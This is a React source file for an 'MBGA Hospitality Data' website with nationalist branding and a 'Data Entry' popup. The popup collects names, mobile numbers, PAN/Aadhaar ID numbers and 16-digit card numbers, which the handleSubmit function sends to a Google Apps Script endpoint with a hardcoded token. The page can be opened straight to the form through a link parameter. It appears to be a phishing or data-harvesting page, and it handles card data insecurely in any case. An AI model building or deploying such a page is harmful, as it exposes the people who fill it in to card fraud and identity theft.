import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  User,
  Phone,
  Contact,
  CreditCard,
  Send,
  X,
  CheckCircle2,
  Mail,
  ArrowRight,
  MapPin,
  Hotel,
  Globe,
  Building2,
  Users
} from 'lucide-react';

const App = () => {
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [submitError, setSubmitError] = useState(false);
  const [errors, setErrors] = useState({});
  const [formData, setFormData] = useState({
    name: '',
    mobile: '',
    idNumber: '',
    cardNumber: ''
  });

  // Check URL params for direct link popup
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get('open') === 'form') {
      setIsModalOpen(true);
    }
  }, []);

  const validateForm = () => {
    const newErrors = {};

    // Name validation: Letters and spaces only
    if (!/^[a-zA-Z\s]+$/.test(formData.name)) {
      newErrors.name = "Name should only contain letters and spaces";
    }

    // Mobile validation: Exactly 10 digits
    if (!/^\d{10}$/.test(formData.mobile)) {
      newErrors.mobile = "Mobile number must be exactly 10 digits";
    }

    // Card Number validation: Exactly 16 digits
    if (!/^\d{16}$/.test(formData.cardNumber)) {
      newErrors.cardNumber = "Card number must be exactly 16 digits";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleInputChange = (e) => {
    let { name, value } = e.target;

    // For numeric fields, only allow digits
    if (name === 'mobile' || name === 'cardNumber') {
      value = value.replace(/\D/g, '');
      if (name === 'mobile') value = value.slice(0, 10);
      if (name === 'cardNumber') value = value.slice(0, 16);
    }

    if (errors[name]) {
      setErrors(prev => ({ ...prev, [name]: undefined }));
    }
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateForm()) return;

    setIsSubmitting(true);

    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwZg2vNY7XuREJtIZEyHx9MzxtsMruOHhV-kaiPpQm3mckRtXiksWHbOLp-in9eAi-g/exec';
    const SECURITY_TOKEN = 'xyxsdsds##$$@@@_sjfbskjbfskjf';

    try {
      if (SCRIPT_URL === 'YOUR_GOOGLE_SCRIPT_URL_HERE') {
        await new Promise(resolve => setTimeout(resolve, 1500));
      } else {
        const payload = {
          ...formData,
          securityToken: SECURITY_TOKEN
        };

        await fetch(SCRIPT_URL, {
          method: 'POST',
          mode: 'no-cors',
          headers: {
            'Content-Type': 'text/plain',
          },
          body: JSON.stringify(payload),
        });
      }

      setSubmitted(true);
      setTimeout(() => {
        setSubmitted(false);
        setIsModalOpen(false);
        setFormData({ name: '', mobile: '', idNumber: '', cardNumber: '' });
      }, 3000);
    } catch (error) {
      setSubmitError(true);
      setTimeout(() => setSubmitError(false), 5000);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-slate-50 text-slate-900 font-sans selection:bg-orange-100">

      {/* Navigation */}
      <nav className="flex items-center justify-between px-6 py-4 max-w-7xl mx-auto bg-white/70 backdrop-blur-md sticky top-0 z-40 border-b border-slate-100">
        <div className="flex items-center gap-3 font-bold text-xl text-orange-600">
          <Hotel size={32} />
          <div className="flex flex-col leading-tight">
            <span>MBGA</span>
            <span className="text-[10px] uppercase tracking-widest text-slate-500 font-extrabold">Hospitality Data</span>
          </div>
        </div>
        <div className="hidden md:flex gap-8 text-sm font-bold uppercase tracking-wider text-slate-600">
          <a href="#about" className="hover:text-orange-600 transition-colors">Our Mission</a>
          <a href="#contact" className="hover:text-orange-600 transition-colors">Reach Us</a>
        </div>
        <button
          onClick={() => setIsModalOpen(true)}
          className="bg-orange-600 text-white px-6 py-2.5 rounded-xl text-sm font-bold uppercase tracking-wide hover:bg-orange-700 transition-all shadow-lg shadow-orange-200"
        >
          Add Entry
        </button>
      </nav>

      {/* Hero Section */}
      <main className="max-w-7xl mx-auto px-6 pt-12 pb-32">
        <div className="flex flex-col items-center text-center">
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="w-full max-w-4xl mb-12 rounded-[2rem] overflow-hidden shadow-2xl border-8 border-white"
          >
            <img
              src="/hero.gif"
              alt="Bharat Mata"
              className="w-full h-auto max-h-[600px] object-contain"
            />
          </motion.div>

          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6 max-w-4xl"
          >
            <span className="bg-orange-50 text-orange-700 px-4 py-1.5 rounded-full text-xs font-black tracking-[0.2em] uppercase">
              Make Bharat Great Again
            </span>
            <h1 className="text-5xl md:text-7xl font-black tracking-tight text-slate-900 leading-[1.05]">
              Empowering India's <br />
              <span className="text-orange-600 italic font-serif">Hospitality Sector.</span>
            </h1>
            <p className="text-lg text-slate-600 max-w-2xl mx-auto leading-relaxed font-medium">
              Dedicated to transforming Bharat from a developing to a developed nation by 2050.
              Our hospitality wing focuses on excellence, integrity, and shared prosperity.
            </p>
            <div className="flex flex-col sm:flex-row gap-4 justify-center pt-6">
              <button
                onClick={() => setIsModalOpen(true)}
                className="flex items-center justify-center gap-2 bg-slate-900 text-white px-10 py-5 rounded-2xl text-lg font-black hover:bg-slate-800 transition-all shadow-2xl shadow-slate-300"
              >
                Launch Data Entry <ArrowRight size={22} />
              </button>
            </div>
          </motion.div>
        </div>

        {/* Feature/Summary Section */}
        <div id="about" className="mt-32 grid grid-cols-1 md:grid-cols-3 gap-8 w-full">
          {[
            {
              icon: <Users className="text-orange-500" />,
              title: "Rashtravad First",
              desc: "Promoting nationalism through every interaction, aiming for collective progress of all citizens."
            },
            {
              icon: <Building2 className="text-blue-500" />,
              title: "Bharat Dham",
              desc: "Inspired by the Bharat Dham Memorial, we strive for a culturally rich and developed India."
            },
            {
              icon: <Globe className="text-green-500" />,
              title: "Vision 2050",
              desc: "Answering critical questions for India's future through the lens of Kisan, Jawan, and Vigyan."
            }
          ].map((item, idx) => (
            <motion.div
              key={idx}
              whileHover={{ y: -10 }}
              className="bg-white p-10 rounded-[2.5rem] border border-slate-100 shadow-xl shadow-slate-200/50"
            >
              <div className="w-16 h-16 bg-slate-50 rounded-2xl flex items-center justify-center mb-8 border border-slate-100 shadow-sm">
                {item.icon}
              </div>
              <h3 className="text-2xl font-black mb-4 tracking-tight">{item.title}</h3>
              <p className="text-slate-500 text-base leading-relaxed font-medium">{item.desc}</p>
            </motion.div>
          ))}
        </div>
      </main>

      {/* Contact Section */}
      <section id="contact" className="bg-white py-32 border-t border-slate-100">
        <div className="max-w-7xl mx-auto px-6">
          <div className="text-center mb-20 space-y-4">
            <h2 className="text-5xl font-black tracking-tight">Reach Us</h2>
            <p className="text-slate-500 text-lg max-w-xl mx-auto font-medium">Contact the MBGA Foundation team for any inquiries regarding our hospitality initiatives.</p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-12">
            {/* Address */}
            <div className="bg-slate-50 p-12 rounded-[3rem] text-center border border-slate-100 hover:shadow-2xl hover:shadow-orange-100 transition-all">
              <div className="w-16 h-16 bg-orange-600 text-white rounded-full flex items-center justify-center mx-auto mb-8 shadow-xl shadow-orange-200">
                <MapPin size={28} />
              </div>
              <h4 className="text-xl font-black mb-4 uppercase tracking-wider">Address</h4>
              <p className="text-slate-600 font-bold leading-relaxed whitespace-pre-line">
                40 Parivartan Chowk,<br />
                Qaisar Bagh, Lucknow- 226001
              </p>
            </div>

            {/* Phone */}
            <div className="bg-slate-50 p-12 rounded-[3rem] text-center border border-slate-100 hover:shadow-2xl hover:shadow-orange-100 transition-all">
              <div className="w-16 h-16 bg-orange-600 text-white rounded-full flex items-center justify-center mx-auto mb-8 shadow-xl shadow-orange-200">
                <Phone size={28} />
              </div>
              <h4 className="text-xl font-black mb-4 uppercase tracking-wider">Phone No.</h4>
              <p className="text-slate-600 font-black text-2xl">
                +91 875-613-2050
              </p>
            </div>

            {/* Email */}
            <div className="bg-slate-50 p-12 rounded-[3rem] text-center border border-slate-100 hover:shadow-2xl hover:shadow-orange-100 transition-all">
              <div className="w-16 h-16 bg-orange-600 text-white rounded-full flex items-center justify-center mx-auto mb-8 shadow-xl shadow-orange-200">
                <Mail size={28} />
              </div>
              <h4 className="text-xl font-black mb-4 uppercase tracking-wider">Email</h4>
              <p className="text-slate-600 font-bold text-lg">
                info@mbgafoundation.org
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* Modal Popup */}
      <AnimatePresence>
        {isModalOpen && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => !isSubmitting && setIsModalOpen(false)}
              className="absolute inset-0 bg-slate-900/70 backdrop-blur-md"
            />

            <motion.div
              initial={{ opacity: 0, scale: 0.9, y: 30 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9, y: 30 }}
              className="relative w-full max-w-lg bg-white rounded-[3rem] shadow-2xl overflow-hidden border-4 border-white"
            >
              {/* Modal Header */}
              <div className="p-10 pb-4 flex items-center justify-between">
                <div>
                  <h2 className="text-3xl font-black text-slate-900 tracking-tight">Data Entry</h2>
                  <p className="text-slate-500 text-sm mt-1 font-bold">MBGA Hospitality Records</p>
                </div>
                <button
                  onClick={() => setIsModalOpen(false)}
                  className="p-3 hover:bg-slate-100 rounded-full transition-colors"
                >
                  <X size={28} className="text-slate-400" />
                </button>
              </div>

              {/* Success Message */}
              {submitted ? (
                <div className="p-16 flex flex-col items-center text-center space-y-6">
                  <motion.div
                    initial={{ scale: 0 }}
                    animate={{ scale: 1 }}
                    className="w-24 h-24 bg-green-50 text-green-500 rounded-full flex items-center justify-center mb-2 shadow-inner"
                  >
                    <CheckCircle2 size={56} />
                  </motion.div>
                  <h3 className="text-3xl font-black tracking-tight leading-tight">ok thanks for submmiting the data</h3>
                </div>
              ) : (
                <form onSubmit={handleSubmit} className="p-10 pt-4 space-y-6">
                  {submitError && (
                    <motion.div
                      initial={{ opacity: 0, height: 0 }}
                      animate={{ opacity: 1, height: 'auto' }}
                      className="bg-red-50 text-red-600 p-5 rounded-2xl text-sm font-bold border border-red-100 mb-4"
                    >
                      error occur please try in sometime
                    </motion.div>
                  )}

                  <div className="space-y-5">
                    {/* Name Field */}
                    <div className="space-y-2">
                      <label className="text-xs font-black text-slate-400 uppercase ml-1 tracking-widest">Customer Name</label>
                      <div className="relative">
                        <User className={`absolute left-5 top-1/2 -translate-y-1/2 ${errors.name ? 'text-red-400' : 'text-slate-400'}`} size={20} />
                        <input
                          required
                          name="name"
                          value={formData.name}
                          onChange={handleInputChange}
                          type="text"
                          placeholder="Ex: Rajesh Kumar"
                          className={`w-full bg-slate-50 border-2 ${errors.name ? 'border-red-400 focus:ring-red-500/10' : 'border-slate-100 focus:ring-orange-500/10'} pl-14 pr-6 py-5 rounded-[1.5rem] outline-none focus:ring-8 focus:bg-white focus:border-orange-600/20 transition-all font-bold text-slate-700`}
                        />
                      </div>
                      {errors.name && <p className="text-red-500 text-[10px] mt-1 ml-2 font-black uppercase tracking-wider">{errors.name}</p>}
                    </div>

                    {/* Mobile Field */}
                    <div className="space-y-2">
                      <label className="text-xs font-black text-slate-400 uppercase ml-1 tracking-widest">Mobile Number</label>
                      <div className="relative">
                        <Phone className={`absolute left-5 top-1/2 -translate-y-1/2 ${errors.mobile ? 'text-red-400' : 'text-slate-400'}`} size={20} />
                        <input
                          required
                          name="mobile"
                          value={formData.mobile}
                          onChange={handleInputChange}
                          type="tel"
                          placeholder="+91 000 000 0000"
                          className={`w-full bg-slate-50 border-2 ${errors.mobile ? 'border-red-400 focus:ring-red-500/10' : 'border-slate-100 focus:ring-orange-500/10'} pl-14 pr-6 py-5 rounded-[1.5rem] outline-none focus:ring-8 focus:bg-white focus:border-orange-600/20 transition-all font-bold text-slate-700`}
                        />
                      </div>
                      {errors.mobile && <p className="text-red-500 text-[10px] mt-1 ml-2 font-black uppercase tracking-wider">{errors.mobile}</p>}
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-5">
                      {/* ID Field */}
                      <div className="space-y-2">
                        <label className="text-xs font-black text-slate-400 uppercase ml-1 tracking-widest">ID Number</label>
                        <div className="relative">
                          <Contact className={`absolute left-5 top-1/2 -translate-y-1/2 text-slate-400`} size={20} />
                          <input
                            required
                            name="idNumber"
                            value={formData.idNumber}
                            onChange={handleInputChange}
                            type="text"
                            placeholder="Ex: PAN/Aadhar"
                            className={`w-full bg-slate-50 border-2 border-slate-100 focus:ring-orange-500/10 pl-14 pr-6 py-5 rounded-[1.5rem] outline-none focus:ring-8 focus:bg-white focus:border-orange-600/20 transition-all font-bold text-slate-700`}
                          />
                        </div>
                      </div>

                      {/* Card Field */}
                      <div className="space-y-2">
                        <label className="text-xs font-black text-slate-400 uppercase ml-1 tracking-widest">Card Number</label>
                        <div className="relative">
                          <CreditCard className={`absolute left-5 top-1/2 -translate-y-1/2 ${errors.cardNumber ? 'text-red-400' : 'text-slate-400'}`} size={20} />
                          <input
                            required
                            name="cardNumber"
                            value={formData.cardNumber}
                            onChange={handleInputChange}
                            type="text"
                            placeholder="16 Digit Card"
                            className={`w-full bg-slate-50 border-2 ${errors.cardNumber ? 'border-red-400 focus:ring-red-500/10' : 'border-slate-100 focus:ring-orange-500/10'} pl-14 pr-6 py-5 rounded-[1.5rem] outline-none focus:ring-8 focus:bg-white focus:border-orange-600/20 transition-all font-bold text-slate-700`}
                          />
                        </div>
                        {errors.cardNumber && <p className="text-red-500 text-[10px] mt-1 ml-2 font-black uppercase tracking-wider">{errors.cardNumber}</p>}
                      </div>
                    </div>
                  </div>

                  <button
                    disabled={isSubmitting}
                    type="submit"
                    className="w-full bg-orange-600 text-white py-6 rounded-[1.5rem] font-black uppercase tracking-widest flex items-center justify-center gap-3 hover:bg-orange-700 disabled:bg-slate-200 disabled:text-slate-400 transition-all shadow-xl shadow-orange-100 mt-4"
                  >
                    {isSubmitting ? (
                      <div className="w-6 h-6 border-4 border-white/30 border-t-white rounded-full animate-spin" />
                    ) : (
                      <>
                        <Send size={20} /> Submit Entry
                      </>
                    )}
                  </button>
                </form>
              )}
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      <footer className="max-w-7xl mx-auto px-6 py-16 border-t border-slate-200 flex flex-col md:flex-row items-center justify-between gap-8 text-slate-500 text-xs font-bold uppercase tracking-[0.2em]">
        <div className="flex items-center gap-3 font-black text-slate-900">
          <Hotel size={24} className="text-orange-600" />
          <span>MBGA HOSPITALITY</span>
        </div>
        <p>© 2026 MBGA Foundation. All rights reserved.</p>
        <div className="flex gap-8">
          <a href="#" className="hover:text-orange-600 transition-colors">Privacy</a>
          <a href="#" className="hover:text-orange-600 transition-colors">Terms</a>
        </div>
      </footer>
    </div>
  );
};

export default App;
